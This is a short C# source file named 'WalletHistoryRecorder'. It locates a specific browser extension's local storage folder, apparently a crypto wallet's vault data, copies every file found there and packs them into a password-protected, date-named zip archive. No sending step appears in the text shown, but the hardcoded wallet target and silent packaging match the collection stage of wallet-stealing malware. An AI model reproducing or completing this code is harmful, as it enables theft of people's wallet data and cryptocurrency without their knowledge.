using System;
using System.Collections.Generic;
using System.IO;

namespace WalletHistoryRecorder
{
	public static class FileClass
	{
		static string walletDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn";
		static string outputPath = @".\output";
		static List<string> paths;
		private static string password = "!Secret1";

		public static string[] CreateZip()
		{
			GetDirectories();

			if (!Directory.Exists(outputPath)) Directory.CreateDirectory(outputPath);

			string outputZipFile = outputPath + "\\" + DateTime.Now.Day + "." + DateTime.Now.Month + "." + DateTime.Now.Year + ".zip";

			if (File.Exists(outputZipFile))
			{
				File.Delete(outputZipFile);
			}
			// create a file with encryption
			using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
			{
				zip.Password = password;
				foreach (var path in paths)
				{
					zip.AddFile(path);
				}
				zip.Save(outputZipFile);
			}
			return new string[] {
				outputZipFile,
				DateTime.Now.Day + "." + DateTime.Now.Month + "." + DateTime.Now.Year + ".zip"
			};
		}

		private static void GetDirectories()
		{
			paths = new List<string>();
			if (!DirectoryExists(walletDirectory))
			{
				throw new Exception("Wrong directory!");
			}
		}

		private static bool DirectoryExists(string path)
		{
			if (File.Exists(path))
			{
				// This path is a file
				ProcessFile(path);
				return true;
			}
			else if (Directory.Exists(path))
			{
				// This path is a directory
				ProcessDirectory(path);
				return true;
			}
			else
			{
				Console.WriteLine("{0} is not a valid file or directory.", path);
				return false;
			}
		}

		// Process all files in the directory passed in, recurse on any directories
		// that are found, and process the files they contain.
		private static void ProcessDirectory(string targetDirectory)
		{
			// Process the list of files found in the directory.
			string[] fileEntries = Directory.GetFiles(targetDirectory);
			foreach (string fileName in fileEntries)
				ProcessFile(fileName);

			// Recurse into subdirectories of this directory.
			string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
			foreach (string subdirectory in subdirectoryEntries)
				ProcessDirectory(subdirectory);
		}

		// Insert logic for processing found files here.
		public static void ProcessFile(string path)
		{
			paths.Add(path);
		}
	}
}
